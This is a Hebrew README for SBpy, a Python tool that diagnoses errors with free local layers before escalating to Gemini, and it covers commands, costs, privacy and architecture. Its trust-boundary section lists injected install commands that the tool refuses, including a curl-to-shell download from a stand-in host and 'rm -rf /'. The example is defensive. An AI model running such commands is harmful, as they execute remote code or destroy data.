<p align="center">
  <img src="assets/logo.jpg" alt="SBpy Logo" width="220" style="border-radius: 16px;" />
</p>

<h1 align="center">SBpy</h1>

<p align="center">
  <strong>Gemini בתוך פייתון — אבל רק כשבאמת צריך.</strong>
</p>

---

רוב השגיאות היומיומיות בפייתון הן שטויות: טעות כתיב בשם משתנה, מפתח שלא קיים
במילון, `import` שנשכח, שם פרמטר עם `u` מיותר. אין שום סיבה לשלוח את זה למודל
שפה ולשלם על כל שגיאה כזו.

SBpy בונה **סולם הסלמה**: כל שגיאה עוברת קודם שכבות מקומיות חינמיות, ורק מה
שנשאר באמת לא פתור מוסלם ל-Gemini.

```
שכבה 1     תיקון מקומי      חינם    difflib · inspect · AST · אינדקס הפרויקט
שכבה 2     ניתוח סטטי       חינם    53 חוקים על עץ התחביר
שכבה 2.5   בסיס ידע         חינם    39 שגיאות פייתון נפוצות עם תשובה קבועה
שכבה 2.6   כללים שנלמדו     חינם    מה ש-Gemini כבר ענה בעבר, מוכלל
שכבה 0     מטמון            חינם    אותה שגיאה בדיוק
שכבה 3     Gemini           כסף     רק אם כל השאר לא הספיק
```

מתוך 19 שגיאות נפוצות שנבדקו, **19 נפתרו בשכבות המקומיות** — אפס קריאות API.

---

## שלוש דרגות מודל

זה הלב של ניהול העלות. ההבדל הוא **מי ביקש**:

| מתי | דרגה | מודל |
|---|---|---|
| הסלמה **אוטומטית** — שגיאה שקרתה, לא ביקשת כלום | `auto` | `gemini-3.5-flash-lite` |
| **פקודה מפורשת** — `/...` ב-shell, או `sbpy exp app.py` | `command` | `gemini-3.6-flash` |
| **`+` בסוף השורה** או `--pro` | `pro` | `gemini-3.1-pro-preview` |

ההיגיון: כשהקוד שלך נופל ו-SBpy מסליק את זה לבד — זה חייב להיות הזול ביותר,
כי לא ביקשת. כשאתה כותב `/SFB` — ביקשת, אז מגיע לך מודל טוב. וכשצריך את
הכבד — מסמנים `+`.

```bash
sbpy sfb app.py          # flash
sbpy sfb app.py +        # pro
sbpy ask "למה זה נופל?" app.py --pro
```

```
>>> /SFB app.py          # flash
>>> /SFB app.py +        # pro
```

---

## התקנה

### Windows — קליק אחד

```
install.bat
```

(או `.\install.ps1` מ-PowerShell.) הסקריפט:

1. יוצר **סביבה מבודדת** ב-`%LOCALAPPDATA%\SBpy\env` — לא נוגע בפייתון הראשי שלך.
2. מתקין לתוכה את SBpy ואת `google-genai`.
3. יוצר פקודת `sbpy` גלובלית ומוסיף אותה ל-PATH.

| דגל | |
|---|---|
| `-Dev` | התקנה editable — שינויים בקוד נכנסים לתוקף מיד |
| `-NoPath` | בלי לגעת ב-PATH |
| `-NoGemini` | בלי `google-genai` (מקומי בלבד) |
| `-Uninstall` | מסיר הכל, כולל את רשומת ה-PATH |

### macOS / Linux

```bash
./install.sh            # ./install.sh --dev  /  --uninstall
```

### בלי להתקין כלום

```
sbpy.cmd sfb app.py
```

### מפתח API

```bash
setx GEMINI_API_KEY "your-key"
```

בלי מפתח SBpy עובד מצוין — פשוט בלי שכבת ההסלמה. `sbpy doctor` מראה מה מחובר.

---

## הסביבה האינטראקטיבית

`sbpy` בלי ארגומנטים פותח REPL. זה ה-REPL **האמיתי** של פייתון (חצים, היסטוריה,
עריכה רב-שורתית), עם שכבה אחת נוספת: **שורה שמתחילה ב-`/` הולכת ל-Gemini**.

```
  SBpy v0.1.0   Gemini זמין
  python 3.14.5

  שורות שמתחילות ב-/ הולכות ישר ל-Gemini:
    / למה הפונקציה הזו איטית?     שאלה חופשית
    /SFB app.py                  קיצור על קובץ · גם SEC / OPT / CMP / EXP / TST / REF
    /EXP my_func                 קיצור על אובייקט מהסשן
    /SFB app.py +                ה-`+` בסוף מעלה דרגה למודל pro

>>> user = {"first_name": "אלי"}
>>> user["frist_name"]
KeyError: 'frist_name'

-- SBpy · אבחון שגיאה ------------------------------------
  [local]  94% המפתח `frist_name` לא קיים במילון
      הצעה: האם התכוונת ל-`first_name`?

-- נפתר מקומית - ללא פנייה ל-Gemini ----------------------

>>> / איך אני מונע את זה מראש?
```

**דקורטורים אמיתיים עוברים כרגיל.** `/property`, `/functools.wraps(f)`,
`/app.route('/x')` — SBpy מזהה שזה קוד פייתון תקין ולא נוגע.

פונקציות עזר בסשן: `err()` `report()` `fix()` `fix(True)` `offline(True)`
`usage()` `status()` `run('app.py')` `sb_help()`.

---

## תיקון אוטומטי

SBpy לא רק מדווח — הוא מתקן:

```bash
sbpy fix app.py             # מציג diff
sbpy fix app.py --apply     # כותב לקובץ (עם גיבוי .sbpy.bak)
sbpy sfb src/ --fix --apply
```

```diff
-import os
 import json
-    print("hello {name}")
-    if value == None:
+    print(f"hello {name}")
+    if value is None:
-    if value is "empty":
+    if value == "empty":
-    if len(data) == 0:
+    if not data:
-    if "key" in data.keys():
+    if "key" in data:
-    except:
+    except Exception:
```

שלוש הגנות: כל תיקון נבנה מהשורה עצמה ולא מניחוש; אחרי החלה הקובץ עובר
`ast.parse` ואם נשבר — ביטול מלא; וגיבוי לפני כתיבה.

גם שגיאות ריצה ניתנות לתיקון — `sbpy.apply_report(report)` או `fix(True)`
ב-shell מתקן טעות כתיב בשם, במפתח או בפרמטר, ומוסיף `import` חסר.

---

## קיצורי הדרך

<!-- sbpy:shortcuts:start -->

| קיצור | מה זה עושה | שכבה מקומית | פונה ל-Gemini |
|---|---|---|---|
| `/API` | יצירת Endpoints (FastAPI / Flask) | style | רק אם המקומי לא מצא |
| `/ARCH` | אכיפת ארכיטקטורה ומעגלי ייבוא | כל הפרויקט | אף פעם |
| `/ASK` | שאלה חופשית | — | תמיד |
| `/ASYNC` | המרה לקוד אסינכרוני | opt | רק אם המקומי לא מצא |
| `/CLEAN` | ניקוי קוד (Cleanup) | style | רק אם המקומי לא מצא |
| `/CLONE` | איתור קוד משוכפל | כל הפרויקט | אף פעם |
| `/CMP` | מדד מורכבות | complexity | אף פעם |
| `/DEAD` | איתור קוד מת | כל הפרויקט | אף פעם |
| `/DEBUG` | הוספת לוגים והדפסות דיבאג | bug | רק אם המקומי לא מצא |
| `/DOC` | כתיבת תיעוד | doc | אף פעם |
| `/EXP` | הסבר קוד | — | תמיד |
| `/MOCK` | יצירת Mocks לטסטים | bug | רק אם המקומי לא מצא |
| `/MOD` | שדרוג לתחביר פייתון מודרני | mod | אף פעם |
| `/NAM` | שיפור שמות | — | תמיד |
| `/OPT` | שיפור ביצועים | opt | רק אם המקומי לא מצא |
| `/REF` | הצעת ריפקטור | — | תמיד |
| `/REVIEW` | סקירת קוד מלאה | bug, sec, opt, style | תמיד |
| `/SEC` | סריקת אבטחה | sec | רק אם המקומי לא מצא |
| `/SFB` | חיפוש באגים | bug, style | רק אם המקומי לא מצא |
| `/SOLID` | אכיפת עקרונות SOLID | style | רק אם המקומי לא מצא |
| `/SQL` | בדיקת שאילתות SQL ואבטחה | sec, opt | רק אם המקומי לא מצא |
| `/TAINT` | ניתוח זרימת מידע ואבטחה | sec | רק אם המקומי לא מצא |
| `/TODO` | רשימת משימות בקוד | todo | אף פעם |
| `/TST` | כתיבת בדיקות | — | תמיד |
| `/TYP` | הוספת רמזי טיפוס | type | אף פעם |

<!-- sbpy:shortcuts:end -->

ארבע דרכים להפעיל:

```bash
sbpy sfb app.py                      # שורת פקודה
```
```python
# /SFB                                הנחיה בקוד -> sbpy scan src/
def build_report(rows=[]):
    ...
```
```python
sbpy.SFB(build_report)               # מפייתון
/sbpy.SFB.on                         # דקורטור: סורק בזמן ההגדרה
```
```
>>> /SFB app.py                      # ב-shell
```

### `/TST` שמאמת את עצמו

```bash
sbpy tst app.py --verify --out tests/test_app.py
```

מייצר בדיקות → מריץ pytest → אם נכשלו, סבב תיקון אחד → מריץ שוב. סבב אחד
בלבד, בכוונה.

### השתקת ממצאים

```python
except OSError:  # noqa
except OSError:  # sbpy: ignore
def f(items=[]):  # sbpy: ignore=mutable-default-arg
```

---

## אינדקס הפרויקט

`NameError` לא מוגבל יותר לקובץ אחד. SBpy בונה אינדקס AST של כל הפרויקט
(מתעדכן רק לקבצים שהשתנו) ופותר גם import חסר בין קבצים — **בחינם**:

```
NameError: name 'normalize_title' is not defined

  [local]  91% `normalize_title` מוגדר בפרויקט, אבל לא מיובא לקובץ הזה
      ההגדרה נמצאת ב-text_tools.py:1.
      הצעה: הוסף: `from lib.text_tools import normalize_title`
```

```bash
sbpy index          # כמה קבצים, כמה שמות
sbpy index clear
```

---

## למידה

כש-Gemini עונה, SBpy מזקק מהתשובה **כלל מקומי** — כדי שהשגיאה הזו לא תעלה
כסף בפעם הבאה:

* `pip install X` על `ModuleNotFoundError` → נשמר מיפוי מודול←חבילה שיעבוד
  בכל פרויקט עתידי.
* חתימת השגיאה (בלי מספרים, כתובות ונתיבים) → אותה שגיאה בקובץ אחר נענית
  מקומית.

```bash
sbpy learn          # כמה נלמד, כמה קריאות נחסכו
sbpy learn clear
```

בנוסף יש **בסיס ידע מובנה** של 39 שגיאות פייתון קלאסיות שהתשובה שלהן קבועה
(`dictionary changed size during iteration`, `CERTIFICATE_VERIFY_FAILED`,
`coroutine was never awaited`, `database is locked`, ועוד). אפשר להרחיב
ב-`~/.sbpy/knowledge.json`.

---

## שליטה בעלות

| משתנה סביבה | ברירת מחדל | משמעות |
|---|---|---|
| `SBPY_OFFLINE` | `0` | `1` = לעולם לא לפנות ל-Gemini |
| `SBPY_THRESHOLD` | `0.72` | ביטחון מקומי שמעליו לא מסלימים |
| `SBPY_MAX_CALLS_RUN` | `10` | תקרת פניות בריצה אחת |
| `SBPY_MAX_CALLS_DAY` | `200` | תקרת פניות ליום |
| `SBPY_MODEL_AUTO` | `gemini-3.5-flash-lite` | דרגת הסלמה אוטומטית |
| `SBPY_MODEL_COMMAND` | `gemini-3.6-flash` | דרגת פקודה |
| `SBPY_MODEL_PRO` | `gemini-3.1-pro-preview` | דרגת `+` |
| `SBPY_INDEX` | `1` | אינדקס הפרויקט |
| `SBPY_KB` | `1` | בסיס הידע המקומי |
| `SBPY_LEARN` | `1` | זיקוק כללים מתשובות |
| `SBPY_CACHE` / `SBPY_CACHE_TTL` | `1` / `30` | מטמון ותוקפו בימים |
| `SBPY_REDACT` / `SBPY_STORE` | `1` / `0` | ניקוי סודות · שמירה בשרת |
| `SBPY_CONTEXT_LINES` | `8` | רדיוס ההקשר |
| `SBPY_LANG` | `he` | `he` או `en` |
| `SBPY_SSL` | `auto` | `system` / `certifi` |
| `SBPY_PROFILE` | `strict` | כמות הרעש: `quiet` (שגיאות בלבד) / `normal` (אזהרות ומעלה) / `strict` (הכל) |
| `SBPY_SCAN_CACHE` | `1` | מטמון לסריקה הסטטית - קובץ שלא השתנה לא נסרק שוב |
| `SBPY_PARALLEL` | לא ב-Windows | סריקה מקבילית בתהליכים |
| `SBPY_PRO_FALLBACK` | `1` | אם דרגת `pro` חסומה בתוכנית - לרדת ל-flash במקום להיכשל |

### כמה רעש להציג

```bash
sbpy sfb src/ --profile quiet    # רק error ו-critical
sbpy sfb src/ --profile normal   # אזהרות ומעלה
sbpy sfb src/ --profile strict   # הכל (ברירת מחדל)
```

עם 25 קיצורים צריך כפתור עוצמה, לא רק `# noqa` פר-שורה.

### מהירות

הסריקה הסטטית ממוטמעת לפי (נתיב, זמן שינוי, גודל, טביעת אצבע של מאגר
החוקים). קובץ שלא השתנה לא נסרק שוב, ושינוי בחוק מבטל את כל המטמון בבת
אחת. בפועל על הפרויקט הזה: **5.9 שניות → 0.9 שניות** בסריקה חוזרת.

```bash
sbpy cache clear     # כולל מטמון הסריקה
```

סריקה מקבילית קיימת אבל **כבויה ב-Windows כברירת מחדל**: המדידה כאן
הראתה שהיא איטית יותר (5.0 שניות מול 3.1), כי `spawn` מייבא מחדש את כל
החבילה בכל worker. ב-Linux/macOS היא דולקת.

**הסלמה מרוכזת:** סריקה של 20 קבצים היא **קריאה אחת**, לא 20. רק קבצים
שהמעבר המקומי לא הכריע לגביהם נכנסים אליה. `--no-batch` מכבה.

```bash
sbpy usage      # פניות, טוקנים, עלות מוערכת, מה נחסך
sbpy cache      # מצב המטמון
sbpy learn      # מה נלמד
```

העלות מוצגת עם `~` כי זו הערכה. המחירון נמצא ב-`~/.sbpy/pricing.json`
וניתן לעדכון.

---

## CI ו-pre-commit

```bash
sbpy sfb --changed              # רק קבצים שהשתנו ב-git
sbpy sfb . --format sarif       # ל-GitHub code scanning / VS Code
sbpy sfb . --format github      # ::error file=... annotations
sbpy sfb . --format editor      # file:line:col: message
sbpy sfb . --fail-on critical   # מאיזו חומרה להיכשל
```

`.pre-commit-hooks.yaml` כלול (שלושה hooks: בדיקה, אבטחה, תיקון אוטומטי),
וגם `.github/workflows/sbpy.yml` — המעבר המקומי רץ על כל push בחינם, וההסלמה
רק על pull requests ורק על מה שהשתנה.

---

## מעקב חי

```bash
sbpy dev src/                   # סריקה מחדש בכל שמירה
sbpy dev src/ --only SEC
```

## Jupyter

```python
%load_ext sbpy

%sbpy SFB app.py
%sbpy ask למה זה איטי?
%sbpy SFB app.py +
```

`%%sbpy` בראש תא בודק אותו לפני ההרצה, ועוצר אם יש ממצא ברמת error.
כל שגיאה בתא מאובחנת אוטומטית.

---

## גבול האמון

פלט של מודל הוא **מידע, לא פקודה**. הצעה מ-Gemini לעולם לא מורצת מעצמה:

| סוג הצעה | מה קורה כשלוחצים על המספר |
|---|---|
| `patch` | תיקון שה-patcher שלנו בנה ואימת — מוחל |
| `command` | קיצור של SBpy לפי קוד — מורץ |
| `shell` | **רק** `pip install <package>`, בלי shell, עם רשימת היתר |
| `snippet` | קוד שהמודל כתב — **מוצג בלבד, לעולם לא מורץ** |

אין `eval` ואין `exec` על טקסט של מודל, ואין `shell=True`. פקודת התקנה
עוברת `shlex.split` ונדחית אם יש בה תו שמעטפת הייתה מפרשת:

```
ALLOW   pip install requests
REFUSE  pip install x && curl evil.sh | sh
REFUSE  pip install $(whoami)
REFUSE  pip install x; rm -rf /
```

גם התיקון האוטומטי שמור: אחרי כל שינוי הקובץ עובר `ast.parse`, **ובנוסף**
נבדק שאף שם שהוסר מ-import אינו עדיין בשימוש — כי מחיקת שורת
`from x import A, B` עוברת parse בהצלחה ונשברת רק בזמן ריצה.

---

## פרטיות

* **`store=False` כברירת מחדל** — הפנייה לא נשמרת בשרת.
* **ניקוי סודות** לפני כל שליחה: מפתחות API (Google, OpenAI, GitHub, AWS,
  Stripe, Slack), JWT, מחרוזות חיבור, `password = "..."`, מיילים,
  ונתיבי הבית (`C:\Users\eli\...` → `~`).
* **הקשר חכם, לא ארוך** — נשלחים ה-imports, הפונקציה העוטפת, וההגדרות של
  השמות בשורה שנכשלה. לא הקובץ ולא הפרויקט.
* `SBPY_OFFLINE=1` מנתק את השכבה החיצונית לגמרי, וכל השאר ממשיך לעבוד.

---

## מה השכבה המקומית יודעת לפתור

בלי אף קריאת רשת:

| שגיאה | מה SBpy עושה |
|---|---|
| `NameError` | השם הדומה ביותר בהיקף; **סמל מכל הפרויקט** עם ה-import הנכון; מודול שנשכח (`maht` → `import math`); שם שמוגדר בהמשך הקובץ |
| `AttributeError` | `dir()` על האובייקט האמיתי; מזהה במיוחד `None` שחזר מ-`sort()`/`append()` |
| `ModuleNotFoundError` | טעות כתיב מול stdlib והמותקנות; מיפוי שם-מודול → שם-pip (`cv2` → `opencv-python`), כולל מיפויים שנלמדו; קובץ מקומי שמסתיר חבילה |
| `KeyError` | קורא את המפתחות האמיתיים; מזהה הבדל אותיות גדולות/קטנות |
| `IndexError` | האורך האמיתי והאינדקס החוקי האחרון |
| `TypeError` | `inspect.signature` על הפונקציה האמיתית; טעות בשם פרמטר; ארגומנטים חסרים; המרות טיפוסים |
| `ValueError` | `int()` שנכשל; פריקה לא תואמת; JSON לא תקין |
| `FileNotFoundError` | קובץ בשם דומה באותה תיקייה; הסבר על תיקיית העבודה |
| `UnboundLocalError` | `global` / `nonlocal` או אתחול |
| `SyntaxError` | סוגריים לא מאוזנים (עם שורת הפתיחה), נקודתיים חסרות, תחביר Python 2, `=` במקום `==` |
| `UnicodeDecodeError` | קידודים מומלצים, כולל `cp1255` לקבצים עבריים ישנים |

מנוע ההתאמה משקלל מרחק עריכה, החלפת תווים סמוכים, קרבה על המקלדת, סגנון
כתיבה (`userName` מול `user_name`) וקידומת משותפת — ומוריד ביטחון כששני
מועמדים קרובים מדי. ל-builtins נדרש סף גבוה יותר, כדי ששם לא מוכר לא
"יתאים" לאיזה builtin אקראי.

---

## ארכיטקטורה

```
sbpy/
├── config.py        תצורה, שלוש דרגות מודל, משתני סביבה
├── i18n.py          קטלוג הודעות עברית/אנגלית
├── results.py       Diagnosis · Finding · Report · ScanResult
├── context.py       חילוץ פריים והערכה בטוחה של ביטויים
├── contextpack.py   בניית ההקשר החכם שנשלח החוצה
├── redact.py        ניקוי סודות
├── cache.py         מטמון דיסק + טביעת אצבע מנורמלת
├── budget.py        תקרות פניות + יומן שימוש
├── pricing.py       הערכת עלות (ניתנת לעדכון)
├── index.py         אינדקס סמלים לכל הפרויקט
├── knowledge.py     בסיס ידע מקומי (שכבה 2.5)
├── learn.py         זיקוק כללים מתשובות Gemini (שכבה 2.6)
├── local/
│   ├── typo.py      מנוע דמיון שמות
│   └── fixers.py    16 מתקנים לפי סוג שגיאה
├── static/
│   └── checks.py    53 חוקי ניתוח סטטי ב-8 קטגוריות
├── patcher.py       תיקון אוטומטי עם diff, אימות וגיבוי
├── gemini.py        Interactions API (יבוא עצל, streaming, TLS)
├── prompts.py       פרומפטים + סכמות JSON
├── ladder.py        סולם ההסלמה
├── batch.py         N פריטים בקריאה אחת
├── shortcuts.py     מנוע הקיצורים + סורק ההנחיות
├── shell.py         ה-REPL ושורות /
├── hooks.py         excepthook · /smart · watch
├── watcher.py       sbpy dev
├── testgen.py       /TST שמריץ את עצמו
├── integrations.py  git · SARIF · GitHub · עורכים
├── magic.py         Jupyter / IPython
├── render.py        תצוגה בטרמינל
└── cli.py           שורת הפקודה
```

עקרונות שנשמרים לאורך כל הקוד:

1. **שום דבר ב-SBpy לא מפיל את הקוד של המשתמש.** כל מתקן, כל בדיקה וכל
   קריאת רשת עטופים ומחזירים "לא ידעתי" במקום להתפוצץ.
2. **אבחון לא מריץ קוד.** `context.resolve` ו-`shell.resolve_argument`
   עושים חיפוש שמות בלבד — בלי `eval`, בלי קריאות פונקציה.
3. **הסלמה היא החלטה מפורשת**, נרשמת ב-`escalation_reason` ומוצגת בשורת
   הסיכום עם הדרגה ומספר הטוקנים.

---

## פתרון בעיות

**`CERTIFICATE_VERIFY_FAILED`** — ה-SDK מאמת מול `certifi` בלבד, אבל ברשתות
עם סינון/פרוקסי שמפענח TLS התעודה קיימת רק במאגר של Windows. SBpy מזהה את
זה לבד (`SBPY_SSL=auto`); לכפייה: `SBPY_SSL=system` או `SBPY_SSL=certifi`.

**`APITimeoutError`** — ביקורת עם המודל החזק לוקחת זמן. `SBPY_TIMEOUT=120`.

**עברית שבורה בטרמינל** — `set PYTHONIOENCODING=utf-8`, או `SBPY_LANG=en`.

**רוצה לוודא שלא יוצא כלום החוצה** — `SBPY_OFFLINE=1`, ואז `sbpy usage`
כדי לראות שהמונה לא זז.

---

## יכולות מתקדמות ואינטגרציות

### 1. שרת LSP מובנה (`sbpy lsp`)
SBpy כולל שרת **Language Server Protocol** עצמאי (פרוטוקול JSON-RPC 2.0 ללא תלויות חיצוניות).
מאפשר לחבר את SBpy ישירות ל-**VS Code**, **PyCharm**, **Neovim** או **Sublime Text**:
- מציג ממצאים בזמן אמת כ-Diagnostics בעורך.
- תומך ב-**QuickFix** (`Ctrl+.` / `Cmd+.`) להחלת תיקונים אוטומטיים ישירות מתוך סביבת הפיתוח.

```bash
sbpy lsp
```

### 2. דוח בריאות אינטראקטיבי ב-HTML (`sbpy report --html`)
מייצר קובץ HTML עשיר, עצמאי לחלוטין (ללא CDN וללא צורך ברשת) הכולל ציון בריאות (A/B/C/D), מדדי אבטחה, ביצועים, וטבלה אינטראקטיבית עם חיפוש וסינון:

```bash
sbpy report --html report.html
```

### 3. חוקי פרויקט מותאמים אישית (`.sbpyrules` / `pyproject.toml`)
ניתן להגדיר קונבנציות ספציפיות לצוות בקובץ `.sbpyrules` (בפורמט JSON) או ב-`pyproject.toml` תחת `[tool.sbpy.rules]`:
- `banned_imports`: איסור על ספריות מסוימות והמלצה על חלופות (למשל `requests -> httpx`).
- `banned_calls`: איסור על קריאות פונקציה ספציפיות (למשל `eval`, `print`).
- `class_name_pattern` / `func_name_pattern`: אכיפת תבניות שמות.

### 4. ריבוי ספקים ושרשרת גיבוי (Multi-Provider Fallback)
תמיכה בספקי ענן ומודלים מקומיים נוספים: **Google Gemini**, **OpenAI-compatible** (Groq, DeepSeek, Together), **Anthropic Claude**, ו-**Local Ollama**.
ניתן להגדיר שרשרת Fallback ב-`SBPY_BACKEND`:

```bash
set SBPY_BACKEND=gemini,openai,ollama
```

### 5. שחזור צעדים ו-Crash Snapshot בזמן אמת (`sbpy trace`)
מריץ סקריפט עם מעקב צעדים עמוק (Time-Travel Timeline). בעת שגיאה מוצגת היסטוריית המשתנים והשורות שרצו לפני הקריסה, ונשמר דוח `crash_dump.json`:

```bash
sbpy trace main.py
```

### 6. אכיפת ארכיטקטורה ומניעת מעגלי יבוא (`sbpy arch` / `/ARCH`)
סורק את כל קשרי ה-Import בפרויקט, מתריע על Circular Imports ומאפשר לאכוף כיווניות של שכבות ארכיטקטורה:

```bash
sbpy arch src/
```

### 7. עוזר מיגרציות אוטונומי (`sbpy migrate`)
ממיר ספריות ישנות וקוד בדיקות לתחביר מודרני (`unittest -> pytest`, `requests -> httpx`, `pydantic v1 -> v2`):

```bash
sbpy migrate tests/test_old.py --target pytest
```

### 8. איתור קוד משוכפל וכפילויות מבניות (`sbpy dup` / `/CLONE`)
מזהה פונקציות זהות או כמעט-זהות מבחינה מבנית (AST Clones) ומציע איחוד לפונקציה משותפת (DRY).

### 9. ניתוח זרימת מידע ואבטחה עמוקה (`sbpy taint` / `/TAINT`)
עוקב אחר קלט לא מסונן (קלט משתמש, פרמטרי HTTP, משתני סביבה) שזורם לתוך פונקציות מסוכנות (SQL, פקודות מערכת, קבצים).

### 10. הסקת טיפוסים מזמן ריצה (`sbpy infer`)
דוגם את הטיפוסים האמיתיים של ארגומנטים וערכי החזרה בזמן ריצת סקריפט או טסטים ומפיק Type Annotations מדויקים לקוד המקור:

```bash
sbpy infer main.py
```

### 11. הפקת דיאגרמות Mermaid חיות (`sbpy diagram`)
מייצר דיאגרמות מחלקות ותרשימי זרימת מודולים בפורמט Mermaid עבור קובצי התיעוד:

```bash
sbpy diagram . --type class --out docs/architecture.md
```

### 13. פלטפורמת Web וצ'אט AI עם החלת קוד בקליק (`sbpy ui` / `/UI`)
דשבורד אינטראקטיבי בדפדפן הכולל:
- **טאב צ'אט AI Pair Programmer**: צ'אט שמכיר את עץ הקבצים, הסמלים והייבואים בפרויקט בזמן אמת.
- **כפתור ⚡ 1-Click Apply to File**: החלת הצעות קוד ישירות על הקובץ במחשב בלחיצת כפתור אחת (עם גיבוי אוטומטי ל-Undo).
- **ציר זמן ויזואלי של קריסות (Time-Travel Crash Debugger)**.
- **חיפוש קוד סמנטי**.

```bash
sbpy ui
```

### 14. מנגנון ריפוי עצמי של טסטים (`sbpy heal` / `/HEAL`)
מריץ את מערך הבדיקות (`pytest` או `unittest`), מזהה כשלים ו-tracebacks, מפעיל את ה-AI לתיקון הקוד ומריץ שוב בלולאה עד ש-**100% מהטסטים עוברים בהצלחה**:

```bash
sbpy heal
```

### 15. סוכן מפתח אוטונומי (`sbpy agent` / `/AGENT`)
סוכן חכם שמקבל יעד בשפה חופשית, מתכנן את שלבי הביצוע, עורך קבצים, מאמת בטסטים ומתקן את עצמו:

```bash
sbpy agent "refactor user models to use pydantic v2 and add test coverage"
```

### 16. חיפוש קוד סמנטי בשפה טבעית (`sbpy find` / `/FIND`)
מאתר פונקציות, מחלקות ולוגיקה לפי משמעות ולא רק לפי מילות מפתח מדויקות:

```bash
sbpy find "where is the retry backoff and error handling implemented?"
```

### 17. מחולל ארכיטקטורה ורכיבים מאפס (`sbpy gen` / `/GEN`)
יוצר פרויקטים ומודולים מרובי קבצים (מודלים, ראוטרים, סכמות ובדיקות יחידה) מתיאור טקסטואלי:

```bash
sbpy gen "fastapi crud for orders with schemas and unit tests"
```

### 18. מדריך פקודות מלא ומחולק לקטגוריות (`sbpy fullinfo` / `/FULLINFO`)
מציג ספריית פקודות מפורטת, מחולקת ל-7 קטגוריות ברורות עם דוגמאות שימוש והסברים.

---

## בדיקות

```bash
py -m unittest discover -s tests
```

387 בדיקות יחידה ואינטגרציה, כולן offline — אף אחת מהן לא נוגעת ברשת.

```
Ran 387 tests in 93.6s
OK
```

SBpy נבדק גם על עצמו: `sbpy sfb sbpy/` ו-`sbpy sec sbpy/` מחזירים נקי לחלוטין (0 שגיאות, 0 ממצאים).

---

## דוגמאות

```bash
python examples/01_errors.py       # אבחון שגיאות
python examples/02_shortcuts.py    # קיצורי דרך
python examples/03_smart.py        # תיקון אוטומטי
```


